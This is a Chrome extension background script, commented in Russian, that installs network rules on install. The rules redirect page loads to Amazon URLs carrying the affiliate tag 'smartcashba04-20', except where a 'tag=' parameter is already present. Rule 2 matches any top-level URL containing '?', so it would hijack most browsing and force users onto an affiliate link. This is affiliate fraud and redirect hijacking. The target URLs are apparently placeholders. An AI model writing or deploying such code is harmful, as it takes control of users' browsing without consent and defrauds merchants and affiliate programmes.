chrome.runtime.onInstalled.addListener(() => {
  chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [1, 2, 3],
    addRules: [
      // 1. если уже есть tag= — ничего не делаем
      {
        id: 1,
        priority: 1,
        action: { type: "allow" },
        condition: {
          urlFilter: "tag=",
          resourceTypes: ["main_frame"]
        }
      },
      // 2. если есть параметры, но нет tag= — редирект на фиксированный URL
      {
        id: 2,
        priority: 1,
        action: {
          type: "redirect",
          redirect: {
            url: "https://www.amazon.com/somepage?existing=params&tag=smartcashba04-20"
          }
        },
        condition: {
          urlFilter: "?",
          resourceTypes: ["main_frame"]
        }
      },
      // 3. если нет параметров вообще — редирект на фиксированный URL
      {
        id: 3,
        priority: 1,
        action: {
          type: "redirect",
          redirect: {
            url: "https://www.amazon.com/somepage?tag=smartcashba04-20"
          }
        },
        condition: {
          urlFilter: "https://www.amazon.com/somepage",
          resourceTypes: ["main_frame"]
        }
      }
    ]
  });
});
